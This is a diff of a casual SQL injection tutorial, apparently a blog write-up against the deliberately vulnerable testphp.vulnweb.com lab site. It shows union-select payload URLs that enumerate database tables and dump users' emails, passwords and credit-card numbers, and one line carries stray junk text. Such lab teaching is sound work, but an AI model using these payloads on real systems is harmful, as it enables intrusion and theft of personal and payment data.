@@ -97,12 +97,15 @@ First row http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,table_
 Second row http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 1,1
 Third row http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 2,1
 Forth row http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 3,1
-and so on...
+and so on.
 ```
+
 
 Stressful right? lol i've gat your back mate
 
+
 we can easily dump the table names once using the ``concat`` statement
+
 
 ```(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=DATABASE())```
 
@@ -138,8 +141,7 @@ let's proceed to the next step
 ``dumping the juicy contents of the database like here we have columns; passwords,emails,creditcards e.t.c in the users table``
 
 
-```http://testphp.vulnweb.com/artists.php?artist=-1+union+select+1,(SELECT+GROUP_CONCAT(email,'::',%20pass,'::',%20name,'::',%20cc,'::',uname,'::',%20phone%20+SEPARATOR+'::')+FROM+users%20),3
-```
+```http://testphp.vulnweb.com/artists.php?artist=-1+union+select+1,(SELECT+GROUP_CONCAT(email,'::',%20pass,'::',%20name,'::',%20cc,'::',uname,'::',%20phone%20+SEPARATOR+'::')+FROM+users%20),3```RRRFRV fff 
 
 ![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/4c5bc588-ce79-42e1-88a0-0d81313663af)
 
